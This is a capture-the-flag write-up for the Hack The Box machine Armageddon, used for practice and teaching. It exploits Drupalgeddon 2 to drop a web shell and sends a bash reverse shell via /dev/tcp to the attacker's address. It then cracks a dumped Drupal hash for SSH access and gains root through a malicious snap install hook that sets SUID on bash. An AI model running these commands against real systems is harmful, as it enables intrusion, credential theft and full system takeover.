# Hack The Box: Armageddon

**Difficulty:** Easy
**OS:** Linux

Armageddon is an Easy-level Linux machine focused heavily on exploiting outdated Content Management Systems and local system misconfigurations. The initial foothold is achieved by exploiting a severe Remote Code Execution (RCE) vulnerability in Drupal (Drupalgeddon 2). Lateral movement involves extracting database credentials from the Drupal configuration, extracting password hashes, and cracking them to pivot to a local user. Finally, privilege escalation abuses an insecure `sudo` configuration involving the `snap` package manager.

---

## Reconnaissance

We begin the assessment by scanning the target for open ports using `nmap`.

```bash
nmap -p- --min-rate 10000 10.10.10.233
nmap -p 22,80 -sCV 10.10.10.233
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 7.4 protocol 2.0)
*   **Port 80:** HTTP (Apache httpd 2.4.6 CentOS)

The HTTP service is identified as a Drupal 7 installation based on `nmap` HTTP-generator scripts and the default `robots.txt` file contents.

## Web Exploitation

Accessing the web server on port 80 reveals a standard, mostly unconfigured Drupal installation. 

### Identifying the Drupal Version

To determine if the Drupal instance is vulnerable to known exploits, we need its exact version. A common file left behind in default installations is `CHANGELOG.txt`. We request this file directly.

```bash
curl -s http://10.10.10.233/CHANGELOG.txt | head
```

The output indicates the version is Drupal 7.56.

### Exploiting Drupalgeddon 2 (CVE-2018-7600)

Drupal 7.56 is vulnerable to a notorious remote code execution flaw known as "Drupalgeddon 2" (CVE-2018-7600). The vulnerability allows an unauthenticated attacker to execute arbitrary code due to inadequate input sanitization in the Form API (FAPI).

There are numerous publicly available exploit scripts for Drupalgeddon 2, ranging from Metasploit modules to standalone Python and Ruby scripts.

We download a popular standalone Ruby script (`drupalgeddon2.rb` or similar) and execute it against the target.

```bash
./drupalgeddon2.rb http://10.10.10.233
```

The script successfully identifies the vulnerability, exploits it, and typically drops a lightweight PHP web shell in the web root (e.g., `shell.php`).

We use this web shell to execute a robust reverse shell payload, connecting back to our attacking machine.

```bash
# Executing via the dropped webshell
curl -G --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/10.10.14.X/9999 0>&1'" 'http://10.10.10.233/shell.php'
```

We catch the reverse shell on our Netcat listener.

```bash
nc -lnvp 9999
# Connection received
id
# uid=48(apache) gid=48(apache) groups=48(apache)
```

## Lateral Movement

We gain initial access as the `apache` user. The `user.txt` flag is not accessible, indicating we must pivot to a standard system user. Checking the `/home` directory reveals a user named `brucetherealadmin`.

### Extracting Database Credentials

Because the application is Drupal, the backend relies on a database. We examine the Drupal configuration file (`settings.php`) to extract the database credentials.

```bash
cat /var/www/html/sites/default/settings.php | grep -i password
```

The file reveals plaintext database credentials: `drupaluser:CQHEy@9M*m23gBVj`.

### Cracking Password Hashes

We connect to the local MySQL instance using the extracted credentials.

```bash
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'show databases;'
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'use drupal; select name, pass from users;'
```

The query returns the bcrypt password hash for the Drupal administrative user (`brucetherealadmin`).

```text
brucetherealadmin : $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

We save the hash to a local file on our attacking machine and use Hashcat to crack it against the `rockyou.txt` wordlist. The hash format for Drupal 7 is typically mode 7900 in Hashcat.

```bash
hashcat -m 7900 hash.txt rockyou.txt
```

Hashcat successfully cracks the hash, revealing the plaintext password: `booboo`.

We test for password reuse by attempting to authenticate via SSH as the system user `brucetherealadmin`.

```bash
ssh brucetherealadmin@10.10.10.233
# Password: booboo
# Authentication successful
```
We retrieve the `user.txt` flag.

## Privilege Escalation

Enumerating the system as `brucetherealadmin`, we check for commands the user can run using `sudo`.

```bash
sudo -l
```

The output reveals that the user can run the `snap` package manager as `root` without a password.

```text
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

### Abusing Sudo & snap

The `snap` utility is used to manage universal Linux packages. A known privilege escalation vector exists when a user is allowed to install snap packages (`snap install *`) with `sudo`.

We can craft a malicious snap package that contains a setup hook (an install script). When the snap package is installed, the `snapd` daemon executes the setup hook as the `root` user.

We create a malicious snap package on our attacking machine. We can use a tool like `fpm` (Effing Package Management) to quickly build a `.snap` file, or manually create the required directory structure (`meta/snap.yaml` and `meta/hooks/install`).

The `install` hook script will contain our payload, such as setting the SUID bit on `/bin/bash` or copying the `root.txt` flag.

```bash
# Example hook script (install)
#!/bin/bash
chmod +s /bin/bash
```

We build the `.snap` package (e.g., `exploit.snap`) and transfer it to the target machine via `scp` or a Python HTTP server.

Once the malicious snap package is on the target machine, we install it using the permitted `sudo` command. The `--dangerous` flag is required to install unsigned snaps locally.

```bash
sudo /usr/bin/snap install exploit.snap --dangerous
```

The installation process triggers the `install` hook, executing our malicious script as root. We then execute the SUID bash binary.

```bash
/bin/bash -p
# id
uid=0(root) gid=1000(brucetherealadmin) euid=0(root) groups=1000(brucetherealadmin)
```

The system is fully compromised, and the `root.txt` flag is obtained.
